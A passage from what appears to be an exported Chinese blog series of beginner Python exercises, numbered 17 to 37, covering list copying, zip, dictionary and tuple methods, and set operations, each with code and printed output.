<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test17</span><span class="params">()</span>:</span></span><br><span class="line">    a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    b = a</span><br><span class="line">    print(<span class="string">"ori a = &#123;0&#125;, b = &#123;1&#125;"</span>.format(a, b))</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">9</span></span><br><span class="line">    print(<span class="string">"res a = &#123;0&#125;, b = &#123;1&#125;"</span>.format(a, b))</span><br><span class="line">    print(<span class="string">"res id(a) == id(b) &#123;0&#125;"</span>.format(id(a)==id(b)))</span><br><span class="line">    </span><br><span class="line">    aa = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    bb = aa.copy()</span><br><span class="line">    print(<span class="string">"ori aa = &#123;0&#125;, bb = &#123;1&#125;"</span>.format(aa, bb))</span><br><span class="line">    bb[<span class="number">0</span>] = <span class="number">9</span></span><br><span class="line">    print(<span class="string">"res aa = &#123;0&#125;, bb = &#123;1&#125;"</span>.format(aa, bb))</span><br><span class="line">    print(<span class="string">"res id(aa) == id(bb) &#123;0&#125;"</span>.format(id(aa)==id(bb)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    ori a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    res a = [<span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>], b = [<span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    res id(a) == id(b) <span class="literal">True</span></span><br><span class="line">    ori aa = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], bb = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    res aa = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], bb = [<span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    res id(aa) == id(bb) <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>18、将列表 [‘x’,‘y’,‘z’] 和 [1,2,3] 转成 [(‘x’,1),(‘y’,2),(‘z’,3)] 的形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test18</span><span class="params">()</span>:</span></span><br><span class="line">    test_list_a = [<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</span><br><span class="line">    test_list_b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    test_list_c = zip(test_list_a, test_list_b)</span><br><span class="line">    test_list_d = list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test_list_c:</span><br><span class="line">        test_list_d.append(i)</span><br><span class="line">    print(<span class="string">"res list c = &#123;0&#125;"</span>.format(test_list_c))</span><br><span class="line">    print(<span class="string">"res list d = &#123;0&#125;"</span>.format(test_list_d))</span><br><span class="line">    <span class="comment"># zip 方法在 Python 2 和 Python 3 中的不同：在 Python 3.x 中为了减少内存，zip() 返回的是一个对象。如需展示列表，需手动 list() 转换</span></span><br><span class="line">    <span class="comment"># zip test</span></span><br><span class="line">    a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">    print(<span class="string">"zip a b = &#123;0&#125;"</span>.format(zip(a, b)))</span><br><span class="line">    print(<span class="string">"python3 zip a b = &#123;0&#125;"</span>.format(list(zip(a, b))))</span><br><span class="line">    aa, bb = zip(*zip(a, b)) <span class="comment"># 与zip相反, zip(*)解压，返回二维矩阵式</span></span><br><span class="line">    print(<span class="string">"unzip aa = &#123;0&#125;, bb = &#123;1&#125;"</span>.format(aa, bb))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    res list c = &lt;zip object at <span class="number">0x7f5b8da65eb0</span>&gt;</span><br><span class="line">    res list d = [(<span class="string">'x'</span>, <span class="number">1</span>), (<span class="string">'y'</span>, <span class="number">2</span>), (<span class="string">'z'</span>, <span class="number">3</span>)]</span><br><span class="line">    zip a b = &lt;zip object at <span class="number">0x7f5b8da703c0</span>&gt;</span><br><span class="line">    python3 zip a b = [(<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">5</span>), (<span class="number">3</span>, <span class="number">6</span>)]</span><br><span class="line">    unzip aa = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), bb = (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p>19、以列表形式返回字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中所有的键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test19</span><span class="params">()</span>:</span></span><br><span class="line">    test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    print(<span class="string">"ori dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">    <span class="keyword">for</span> test_key <span class="keyword">in</span> test_dict.keys():</span><br><span class="line">        print(<span class="string">"test_key = &#123;0&#125;"</span>.format(test_key))</span><br><span class="line">    print(<span class="string">"res test key = &#123;0&#125;"</span>.format(list(test_dict.keys())))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    test_key = Alice</span><br><span class="line">    test_key = Beth</span><br><span class="line">    test_key = Cecil</span><br><span class="line">    res test key = [<span class="string">'Alice'</span>, <span class="string">'Beth'</span>, <span class="string">'Cecil'</span>]</span><br></pre></td></tr></table></figure>

<p>20、以列表形式返回字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中所有的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test20</span><span class="params">()</span>:</span></span><br><span class="line">    test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    print(<span class="string">"ori dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">    print(<span class="string">"res test value = &#123;0&#125;"</span>.format(list(test_dict.values())))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    res test value = [<span class="number">20</span>, <span class="number">18</span>, <span class="number">21</span>]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-3</title>
    <url>/2020/02/13/blog_formal/%E5%BC%80%E5%8F%91/python/python100-3/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第三拍"><a href="#第三拍" class="headerlink" title="第三拍"></a>第三拍</h2><p>21、以列表形式返回字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中所有键值对组成的元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test21</span><span class="params">()</span>:</span></span><br><span class="line">    test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    print(<span class="string">"res list = &#123;0&#125;"</span>.format([i <span class="keyword">for</span> i <span class="keyword">in</span> test_dict.items()]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res list = [(<span class="string">'Alice'</span>, <span class="number">20</span>), (<span class="string">'Beth'</span>, <span class="number">18</span>), (<span class="string">'Cecil'</span>, <span class="number">21</span>)]</span><br></pre></td></tr></table></figure>

<p>22、向字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中追加 ‘David’:19 键值对，更新Cecil的值为17。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test22</span><span class="params">()</span>:</span></span><br><span class="line">	test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">	print(<span class="string">"ori test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">	<span class="comment"># test_dict['David'] = 19</span></span><br><span class="line">	test_dict.update(&#123;<span class="string">'David'</span>: <span class="number">19</span>&#125;)</span><br><span class="line">	print(<span class="string">"res1 test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">	<span class="comment"># test_dict['Cecil'] = 17</span></span><br><span class="line">	test_dict.update(&#123;<span class="string">'Cecil'</span>: <span class="number">17</span>&#125;)</span><br><span class="line">	print(<span class="string">"res2 test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    res1 test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>, <span class="string">'David'</span>: <span class="number">19</span>&#125;</span><br><span class="line">    res2 test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">17</span>, <span class="string">'David'</span>: <span class="number">19</span>&#125;</span><br></pre></td></tr></table></figure>

<p>23、删除字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中的Beth键后，清空该字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test23</span><span class="params">()</span>:</span></span><br><span class="line">	test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">	print(<span class="string">"ori test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">	test_dict.pop(<span class="string">'Beth'</span>)</span><br><span class="line">	print(<span class="string">"res1 test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">	test_dict.clear()</span><br><span class="line">	print(<span class="string">"res2 test_dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    res1 test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">    res2 test_dict = &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>24、判断 David 和 Alice 是否在字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21} 中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test24</span><span class="params">()</span>:</span></span><br><span class="line">	test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">	print(<span class="string">"David in test_dict = &#123;0&#125;"</span>.format(<span class="string">'David'</span> <span class="keyword">in</span> test_dict))</span><br><span class="line">	print(<span class="string">"Alice in test_dict = &#123;0&#125;"</span>.format(<span class="string">'Alice'</span> <span class="keyword">in</span> test_dict))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    David <span class="keyword">in</span> test_dict = <span class="literal">False</span></span><br><span class="line">    Alice <span class="keyword">in</span> test_dict = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>25、遍历字典 {‘Alice’: 20, ‘Beth’: 18, ‘Cecil’: 21}，打印键值对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test25</span><span class="params">()</span>:</span></span><br><span class="line">	test_dict = &#123;<span class="string">'Alice'</span>: <span class="number">20</span>, <span class="string">'Beth'</span>: <span class="number">18</span>, <span class="string">'Cecil'</span>: <span class="number">21</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> i_k, i_v <span class="keyword">in</span> test_dict.items():</span><br><span class="line">		print(<span class="string">"key = &#123;0&#125; value = &#123;1&#125;"</span>.format(i_k, i_v))</span><br><span class="line">	<span class="comment"># or</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> test_dict:</span><br><span class="line">		print(<span class="string">"key = &#123;0&#125; value = &#123;1&#125;"</span>.format(k, test_dict[k]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    key = Alice value = <span class="number">20</span></span><br><span class="line">    key = Beth value = <span class="number">18</span></span><br><span class="line">    key = Cecil value = <span class="number">21</span></span><br><span class="line">    </span><br><span class="line">    key = Alice value = <span class="number">20</span></span><br><span class="line">    key = Beth value = <span class="number">18</span></span><br><span class="line">    key = Cecil value = <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>26、若 a = dict()，令 b = a，执行 b.update({‘x’:1})， a亦被改变。为何？如何避免？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test26</span><span class="params">()</span>:</span></span><br><span class="line">	a = dict()</span><br><span class="line">	a[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line">	a[<span class="string">'b'</span>] = <span class="number">2</span></span><br><span class="line">	b = a</span><br><span class="line">	print(<span class="string">"ori a = &#123;0&#125;, b = &#123;1&#125;"</span>.format(a, b))</span><br><span class="line">	b.update(&#123;<span class="string">'a'</span>:<span class="number">2222</span>&#125;)</span><br><span class="line">	print(<span class="string">"res a = &#123;0&#125;, b = &#123;1&#125;"</span>.format(a, b))</span><br><span class="line">	print(<span class="string">"id a = &#123;0&#125; id b = &#123;1&#125;, id(a) == id(b) = &#123;2&#125;"</span>.format(id(a), id(b), id(a)==id(b)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 避免</span></span><br><span class="line">	aa = dict()</span><br><span class="line">	aa[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line">	aa[<span class="string">'b'</span>] = <span class="number">2</span></span><br><span class="line">	bb = aa.copy()</span><br><span class="line">	print(<span class="string">"ori aa = &#123;0&#125;, bb = &#123;1&#125;"</span>.format(aa, bb))</span><br><span class="line">	bb.update(&#123;<span class="string">'a'</span>:<span class="number">2222</span>&#125;)</span><br><span class="line">	print(<span class="string">"res aa = &#123;0&#125;, bb = &#123;1&#125;"</span>.format(aa, bb))</span><br><span class="line">	print(<span class="string">"id aa = &#123;0&#125; id bb = &#123;1&#125;, id(aa) == id(bb) = &#123;2&#125;"</span>.format(id(aa), id(bb), id(aa)==id(bb)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori a = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;, b = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">    res a = &#123;<span class="string">'a'</span>: <span class="number">2222</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;, b = &#123;<span class="string">'a'</span>: <span class="number">2222</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">    id a = <span class="number">140662249667712</span> id b = <span class="number">140662249667712</span>, id(a) == id(b) = <span class="literal">True</span></span><br><span class="line">    ori aa = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;, bb = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">    res aa = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;, bb = &#123;<span class="string">'a'</span>: <span class="number">2222</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">    id aa = <span class="number">140662249688432</span> id bb = <span class="number">140662250486432</span>, id(aa) == id(bb) = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>27、以列表 [‘A’,‘B’,‘C’,‘D’,‘E’,‘F’,‘G’,‘H’] 中的每一个元素为键，默认值都是0，创建一个字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test27</span><span class="params">()</span>:</span></span><br><span class="line">	test_list = [<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>]</span><br><span class="line">	print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">	res_dict = dict.fromkeys(test_list, <span class="number">0</span>)</span><br><span class="line">	print(<span class="string">"res_dict = &#123;0&#125;"</span>.format(res_dict))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    ori test_list = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>]</span><br><span class="line">    res_dict = &#123;<span class="string">'A'</span>: <span class="number">0</span>, <span class="string">'B'</span>: <span class="number">0</span>, <span class="string">'C'</span>: <span class="number">0</span>, <span class="string">'D'</span>: <span class="number">0</span>, <span class="string">'E'</span>: <span class="number">0</span>, <span class="string">'F'</span>: <span class="number">0</span>, <span class="string">'G'</span>: <span class="number">0</span>, <span class="string">'H'</span>: <span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>

<p>28、将二维结构 [[‘a’,1],[‘b’,2]] 和 ((‘x’,3),(‘y’,4)) 转成字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test28</span><span class="params">()</span>:</span></span><br><span class="line">	test_list = [[<span class="string">'a'</span>,<span class="number">1</span>],[<span class="string">'b'</span>,<span class="number">2</span>]]</span><br><span class="line">	test_tuple = ((<span class="string">'x'</span>,<span class="number">3</span>),(<span class="string">'y'</span>,<span class="number">4</span>))</span><br><span class="line">	print(<span class="string">"res dict = &#123;0&#125;, &#123;1&#125;"</span>.format(dict(test_list), dict(test_tuple)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res dict = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">3</span>, <span class="string">'y'</span>: <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure>

<p>29、将元组 (1,2) 和 (3,4) 合并成一个元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test29</span><span class="params">()</span>:</span></span><br><span class="line">	test_tuple_a = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	test_tuple_b = (<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">	print(<span class="string">"ori test_tuple_a = &#123;0&#125;, test_tuple_b = &#123;1&#125;"</span>.format(test_tuple_a, test_tuple_b))</span><br><span class="line">	print(<span class="string">"res tuple = &#123;0&#125;"</span>.format(test_tuple_a + test_tuple_b))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_tuple_a = (<span class="number">1</span>, <span class="number">2</span>), test_tuple_b = (<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    res tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>30、将空间坐标元组 (1,2,3) 的三个元素解包对应到变量 x,y,z</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test30</span><span class="params">()</span>:</span></span><br><span class="line">	test_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">	x, y, z = test_tuple</span><br><span class="line">	print(<span class="string">"x = &#123;0&#125;, y = &#123;1&#125;, z = &#123;2&#125;"</span>.format(x, y, z))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	x = <span class="number">1</span>, y = <span class="number">2</span>, z = <span class="number">3</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-4</title>
    <url>/2020/02/14/blog_formal/%E5%BC%80%E5%8F%91/python/python100-4/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第四拍"><a href="#第四拍" class="headerlink" title="第四拍"></a>第四拍</h2><p>31、返回元组 (‘Alice’,‘Beth’,‘Cecil’) 中 ‘Cecil’ 元素的索引号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test31</span><span class="params">()</span>:</span></span><br><span class="line">    test_tuple = (<span class="string">'Alice'</span>,<span class="string">'Beth'</span>,<span class="string">'Cecil'</span>)</span><br><span class="line">    print(<span class="string">"index of Cecil = &#123;0&#125;"</span>.format(test_tuple.index(<span class="string">'Cecil'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	index of Cecil = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>32、返回元组 (2,5,3,2,4) 中元素 2 的个数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test32</span><span class="params">()</span>:</span></span><br><span class="line">    test_tuple = (<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">    print(<span class="string">"count of 2 = &#123;0&#125;"</span>.format(test_tuple.count(<span class="number">2</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	count of <span class="number">2</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>33、判断 ‘Cecil’ 是否在元组 (‘Alice’,‘Beth’,‘Cecil’) 中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test33</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 33"</span>)</span><br><span class="line">    test_tuple = (<span class="string">'Alice'</span>,<span class="string">'Beth'</span>,<span class="string">'Cecil'</span>)</span><br><span class="line">    print(<span class="string">"Cecil in test_tuple = &#123;0&#125;"</span>.format(<span class="string">"Cecil"</span> <span class="keyword">in</span> test_tuple))</span><br><span class="line">    print(<span class="string">"AAAAA in test_tuple = &#123;0&#125;"</span>.format(<span class="string">"AAAAA"</span> <span class="keyword">in</span> test_tuple))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    Cecil <span class="keyword">in</span> test_tuple = <span class="literal">True</span></span><br><span class="line">    AAAAA <span class="keyword">in</span> test_tuple = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>34、返回在元组 (2,5,3,7) 索引号为2的位置插入元素 9 之后的新元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test34</span><span class="params">()</span>:</span></span><br><span class="line">    test_tuple = (<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">    print(<span class="string">"ori tuple = &#123;0&#125;"</span>.format(test_tuple))</span><br><span class="line">    res_tuple = (*(<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>)[:<span class="number">2</span>], <span class="number">9</span>, *(<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>)[<span class="number">2</span>:])</span><br><span class="line">    print(<span class="string">"res tuple = &#123;0&#125;"</span>.format(res_tuple))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori tuple = (<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    res tuple = (<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>35、创建一个空集合，增加 {‘x’,‘y’,‘z’} 三个元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test35</span><span class="params">()</span>:</span></span><br><span class="line">    test_set = set()</span><br><span class="line">    test_set.add(<span class="string">'x'</span>)</span><br><span class="line">    test_set.add(<span class="string">'y'</span>)</span><br><span class="line">    test_set.add(<span class="string">'z'</span>)</span><br><span class="line">    print(<span class="string">"res test set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or</span></span><br><span class="line">    test_set = set()</span><br><span class="line">    test_set.update(&#123;<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>&#125;)</span><br><span class="line">    print(<span class="string">"res test set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    res test set = &#123;<span class="string">'x'</span>, <span class="string">'z'</span>, <span class="string">'y'</span>&#125;</span><br><span class="line">    res test set = &#123;<span class="string">'x'</span>, <span class="string">'z'</span>, <span class="string">'y'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>36、删除集合 {‘x’,‘y’,‘z’} 中的 ‘z’ 元素，增j加元素 ‘w’，然后清空整个集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test36</span><span class="params">()</span>:</span></span><br><span class="line">    test_set = &#123;<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line">    <span class="comment"># test_set.pop()  # error 最后一个出栈</span></span><br><span class="line">    test_set.remove(<span class="string">'z'</span>)</span><br><span class="line">    print(<span class="string">"res1 test_set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line">    test_set.add(<span class="string">'w'</span>)</span><br><span class="line">    print(<span class="string">"res2 test_set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line">    test_set.clear()</span><br><span class="line">    print(<span class="string">"res test_set = &#123;0&#125;"</span>.format(test_set))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set = &#123;<span class="string">'x'</span>, <span class="string">'z'</span>, <span class="string">'y'</span>&#125;</span><br><span class="line">    res1 test_set = &#123;<span class="string">'x'</span>, <span class="string">'y'</span>&#125;</span><br><span class="line">    res2 test_set = &#123;<span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>&#125;</span><br><span class="line">    res test_set = set()</span><br></pre></td></tr></table></figure>

<p>37、返回集合 {‘A’,‘D’,‘B’} 中未出现在集合 {‘D’,‘E’,‘C’} 中的元素（差集）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test37</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"test_set_a - test_set_b = &#123;0&#125;"</span>.format(test_set_a - test_set_b))</span><br><span class="line">    <span class="comment"># or</span></span><br><span class="line">    print(<span class="string">"test_set_a - test_set_b = &#123;0&#125;"</span>.format(test_set_a.difference(test_set_b)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    ori test_set_a = &#123;<span class="string">'B'</span>, <span class="string">'D'</span>, <span class="string">'A'</span>&#125; test_set_b = &#123;<span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    test_set_a - test_set_b = &#123;<span class="string">'B'</span>, <span 